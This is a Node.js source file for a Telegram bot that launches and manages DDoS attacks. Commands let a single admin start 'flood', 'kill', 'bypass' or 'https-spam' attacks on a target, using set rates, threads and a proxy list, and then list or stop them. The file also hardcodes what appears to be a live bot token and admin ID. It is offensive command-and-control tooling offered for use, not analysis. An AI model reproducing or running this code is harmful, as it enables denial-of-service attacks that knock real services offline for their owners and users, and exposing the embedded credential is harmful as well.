const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { spawn } = require('child_process')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0'
const adminId = '6601930239'
const bot = new TelegramBot(token, { polling: true })

let attacks = []

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj' })
})

app.listen(port)

bot.on('message', async (msg) => {
  if (msg.text === '/system') {
    if (msg.from.id.toString() !== adminId) {
      bot.sendMessage(msg.chat.id, 'Access denied')
      return
    }
    try {
      const cpu = await si.cpu()
      const mem = await si.mem()
      const os = await si.osInfo()
      const time = await si.time()
      const net = await si.networkStats()
      const load = await si.currentLoad()
      const data = {
        cpu,
        memory: mem,
        os,
        time,
        network: net,
        load
      }
      bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2))
    } catch (e) {
      bot.sendMessage(msg.chat.id, 'Error fetching system info')
    }
  }

  if (msg.text.startsWith('/attack')) {
    if (msg.from.id.toString() !== adminId) {
      bot.sendMessage(msg.chat.id, 'Access denied')
      return
    }
    const args = msg.text.split(' ').slice(1)
    let method = 'flood'
    let target = ''
    let time = 0
    if (['flood', 'kill', 'bypass', 'https-spam'].includes(args[0])) {
      method = args[0]
      target = args[1]
      time = parseInt(args[2])
    } else {
      target = args[0]
      time = parseInt(args[1])
    }
    if (!target || isNaN(time)) {
      bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
      return
    }
    const rate = 25
    const threads = 10
    const proxyfile = './prx.txt'
    const attackId = Date.now()
    bot.sendMessage(msg.chat.id, JSON.stringify({
      status: 'running',
      target,
      time,
      rate,
      threads,
      proxyfile
    }, null, 2))
    const child = spawn('node', [`${method}.js`, target, time, rate, threads, proxyfile])
    attacks.push({
      id: attackId,
      target,
      time,
      rate,
      threads,
      proxyfile,
      status: 'running',
      pid: child.pid,
      process: child
    })
    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
    child.on('close', () => {
      attacks = attacks.filter(a => a.id !== attackId)
    })
  }

  if (msg.text === '/list') {
    if (msg.from.id.toString() !== adminId) {
      bot.sendMessage(msg.chat.id, 'Access denied')
      return
    }
    if (attacks.length === 0) {
      bot.sendMessage(msg.chat.id, 'No active attacks')
      return
    }
    const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n')
    bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`)
  }

  if (msg.text.startsWith('/stop')) {
    if (msg.from.id.toString() !== adminId) {
      bot.sendMessage(msg.chat.id, 'Access denied')
      return
    }
    const attackId = parseInt(msg.text.split(' ')[1])
    const attack = attacks.find(a => a.id === attackId)
    if (!attack) {
      bot.sendMessage(msg.chat.id, 'Attack not found')
      return
    }
    try {
      attack.process.kill('SIGTERM')
      attacks = attacks.filter(a => a.id !== attackId)
      bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
    } catch (e) {
      bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`)
    }
  }
})
